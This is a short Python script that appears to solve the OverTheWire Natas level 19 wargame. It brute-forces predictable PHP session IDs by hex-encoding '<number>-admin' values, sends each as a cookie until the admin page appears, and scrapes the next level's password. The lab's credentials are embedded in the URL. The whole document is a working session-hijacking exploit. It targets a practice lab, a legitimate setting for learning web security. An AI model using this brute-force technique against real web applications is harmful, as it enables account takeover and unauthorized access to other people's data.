import requests
import re

URL = 'http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org/'        

def get_session(length):
    for i in range(length):
        cookieID = ''.join(hex(ord(c))[2:] for c in f"{i}-admin")
        r = requests.get(URL, cookies={'PHPSESSID': cookieID})
        if 'You are an admin' in r.text:
            return re.findall(r'Password: [^<]*', r.text)[0].split(': ')[1]

if __name__ == '__main__':
    if requests.head(URL).status_code == requests.codes.ok:
         print(f'Password = {get_session(641)}')
    else:
        print('Authentication Failed!')
